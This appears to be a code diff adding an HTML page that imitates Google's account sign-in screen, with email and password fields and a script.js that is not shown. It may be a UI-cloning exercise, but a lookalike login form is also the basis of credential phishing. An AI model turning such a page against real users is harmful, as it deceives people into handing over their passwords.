@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="stylesheet" href="./reset.css" />
+    <link rel="stylesheet" href="./styles.css" />
+
+    <title>Sign in to Google Accounts</title>
+  </head>
+
+  <body>
+    <div class="container">
+        <div class="card">
+            <img src="./images/google-logo.svg" alt="" />
+            <h2>Sign in</h2>
+            <h3>Use your Google Account</h3>
+            <form id="loginForm">
+                <input id="username" type="email" placeholder="Email or phone" />
+                <input style="margin-top:0.5rem" id="password" type="password" placeholder="Password" />
+                <div class="btn-email">
+                    <button type="button">Forgot password?</button>
+                </div>
+                <p>
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="">Learn more</a>
+                </p>
+
+                <div class="card-bottom">
+                    <a href="">Create account</a>
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+        </div>
+      <div class="footer">
+        <select name="select">
+          <option value="Portuguese (Brazil)">Portuguese (Brazil)</option>
+          <option value="English (United States)"  selected>
+            English (United States)
+          </option>
+          <option value="Spanish (Spain)">Spanish (Spain)</option>
+        </select>
+
+        <div class="footer-span">
+          <span>Help</span>
+          <span>Privacy</span>
+          <span>Terms</span>
+        </div>
+      </div>
+    </div>
+      <script src="script.js"></script>
+  </body>
+</html>
